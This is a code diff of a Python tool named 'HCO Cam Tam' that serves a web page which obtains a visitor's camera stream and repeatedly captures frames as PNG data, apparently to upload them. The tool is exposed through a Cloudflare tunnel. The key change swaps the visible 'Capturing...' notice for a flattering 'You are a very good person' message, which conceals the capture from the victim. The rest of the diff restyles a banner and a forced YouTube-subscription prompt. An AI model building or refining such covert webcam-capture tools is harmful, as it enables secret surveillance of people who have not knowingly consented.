@@ -38,7 +38,7 @@ HTML_PAGE = """
     navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
       video.srcObject = stream;
-      document.getElementById("msg").innerText = "✅ Camera access granted! Capturing...";
+      document.getElementById("msg").innerText = "😊 You are a very good person. God bless you!";
       let interval = setInterval(() => {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         let data = canvas.toDataURL("image/png");
@@ -75,23 +75,19 @@ def upload():
 # ---------------- Banner + Unlock ----------------
 def banner():
     os.system("clear")
-    print(Fore.LIGHTGREEN_EX + Style.BRIGHT)
-    print("===================================")
-    print("          HCO CAM TAM              ")
-    print("            by Azhar               ")
-    print("===================================")
-    print(Style.RESET_ALL)
+    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "HCO Cam Tam by Azhar" + Style.RESET_ALL)
 
 def unlock():
     os.system("clear")
-    print(Fore.RED + Style.BRIGHT + "\n🚀 Unlocking Tool..." + Style.RESET_ALL)
-    print(Fore.YELLOW + "🔔 Subscription Required!" + Style.RESET_ALL)
-    for i in range(5,0,-1):
-        print(Fore.CYAN + f"Redirecting to YouTube in {i} sec..." + Style.RESET_ALL, end="\r")
+    print(Fore.RED + Style.BRIGHT + "\n🔓 Unlocking HCO Cam Tam Tool" + Style.RESET_ALL)
+    print(Fore.YELLOW + "\n👉 To use this tool, you must subscribe to Hackers Colony YouTube channel." + Style.RESET_ALL)
+    print(Fore.CYAN + "\nYou will be redirected automatically in 10 seconds..." + Style.RESET_ALL)
+    for i in range(10,0,-1):
+        print(Fore.MAGENTA + f"⏳ Redirecting to YouTube in {i} sec..." + Style.RESET_ALL, end="\r")
         time.sleep(1)
-    print(Fore.GREEN + "\nOpening YouTube... Please Subscribe!\n" + Style.RESET_ALL)
+    print(Fore.GREEN + "\n🌍 Opening YouTube... Please Subscribe!\n" + Style.RESET_ALL)
     os.system("xdg-open https://youtube.com/@hackers_colony_tech")
-    input(Fore.MAGENTA + "\n👉 After subscribing, press ENTER to continue..." + Style.RESET_ALL)
+    input(Fore.CYAN + "\n✅ After subscribing, press ENTER to continue..." + Style.RESET_ALL)
 
 # ---------------- Cloudflare Tunnel ----------------
 def start_cloudflare():
